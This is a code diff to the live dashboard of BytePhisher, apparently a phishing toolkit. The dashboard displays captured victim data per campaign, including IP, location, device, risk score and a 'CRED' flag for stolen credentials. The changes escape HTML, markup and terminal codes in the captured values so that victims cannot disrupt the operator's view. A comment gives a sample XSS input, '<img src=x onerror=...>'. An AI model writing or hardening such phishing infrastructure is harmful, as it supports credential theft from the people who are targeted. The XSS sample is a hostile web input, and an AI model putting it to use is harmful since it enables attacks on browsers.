@@ -1,12 +1,26 @@
 # BytePhisher — live dashboard: rich TUI (primary) + optional Flask web dashboard.
 import json
+import re
 import time
+
+
+def _safe_cell(v, limit=120):
+    """Captured values are attacker-controlled: strip ANSI/control characters
+    (terminal manipulation) and neutralise rich markup (a crafted value could
+    inject formatting or raise MarkupError and kill the live dashboard)."""
+    t = "" if v is None else str(v)
+    t = re.sub(r"\x1b\[[0-9;?]*[a-zA-Z]", "", t)
+    t = "".join(ch for ch in t if ch == "\n" or ch == "\t" or ord(ch) >= 32)
+    t = t.replace("[", "\\[")
+    return t[:limit]
+
 
 def make_frame(caps, stats):
     """Build one rich renderable frame (used by live_loop and by callers)."""
-    from rich.table import Table
-    from rich.panel import Panel
     from datetime import datetime
+
+    from rich.panel import Panel
+    from rich.table import Table
 
     t = Table(title="BytePhisher — Live Captures", title_style="bold magenta", expand=True)
     t.add_column("Time", width=8)
@@ -43,9 +57,10 @@ def live_loop(db, stop, refresh=1.5, watchdog=None):
     Reads the capture DB on every refresh, so new hits appear live.
     `watchdog` (optional callable) runs periodically — the CLI uses it to warn
     when a tunneler process dies mid-campaign."""
+    import time as _time
+
     from rich.console import Console
     from rich.live import Live
-    import time as _time
 
     console = Console()
     last_check = _time.time()
@@ -59,10 +74,6 @@ def live_loop(db, stop, refresh=1.5, watchdog=None):
                 last_check = _time.time()
 
 
-def render_tui(caps, stats, refresh=3):
-    """Single-shot TUI snapshot (kept for compatibility / scripting)."""
-    from rich.console import Console
-    Console().print(make_frame(caps, stats))
 
 def render_plain(caps, stats):
     """Non-TTY fallback: print a compact table to stdout."""
@@ -88,8 +99,9 @@ def render_plain(caps, stats):
 def web_dashboard(port=8090, db=None, host="127.0.0.1"):
     """Optional Flask + WebSocket dashboard for remote monitoring.
     Serves / (live table), /api/captures, /api/stats."""
-    from flask import Flask, jsonify, render_template_string, request
     import threading
+
+    from flask import Flask, jsonify, render_template_string, request
 
     app = Flask("bytephisher-dash")
 
@@ -106,15 +118,24 @@ td,th{border-bottom:1px solid #30363d;padding:6px 10px;text-align:left}
 <div id="stats" class="badge"></div>
 <script>
 const tb = document.querySelector('#rows');
+/* Every value below is attacker-controlled (a visitor types it). Without this
+   helper a submitted field value like <img src=x onerror=...> executed in the
+   operator's browser as soon as the row rendered. */
+function esc(v){
+  return String(v===null||v===undefined?'':v)
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
 function rowHtml(c){
   const t=new Date(c.ts*1000).toLocaleTimeString();
-  const f=Object.entries(c.fields).slice(0,4).map(([k,v])=>k+'='+v).join('; ');
+  const f=Object.entries(c.fields).slice(0,4).map(([k,v])=>esc(k)+'='+esc(v)).join('; ');
   const risk=c.risk||0;
   const rc=risk>=70?'#f85149':risk>=30?'#d29922':'#3fb950';
   const rl=risk>=70?'high':risk>=30?'med':'low';
-  return `<tr><td>${t}</td><td>${c.campaign||'—'}</td><td>${c.ip}</td><td>${c.city||c.country||'—'}</td>
-    <td>${c.device}</td><td><span style="color:${rc}">${rl} (${risk})</span></td>
-    <td>${c.is_cred?'<span class="badge">CRED</span>':'·'}</td><td>${f}</td></tr>`;
+  return `<tr><td>${esc(t)}</td><td>${esc(c.campaign||'—')}</td><td>${esc(c.ip)}</td>`
+    + `<td>${esc(c.city||c.country||'—')}</td><td>${esc(c.device)}</td>`
+    + `<td><span style="color:${rc}">${rl} (${Number(risk)||0})</span></td>`
+    + `<td>${c.is_cred?'<span class="badge">CRED</span>':'·'}</td><td>${f}</td></tr>`;
 }
 function setStats(s){
   document.getElementById('stats').textContent =
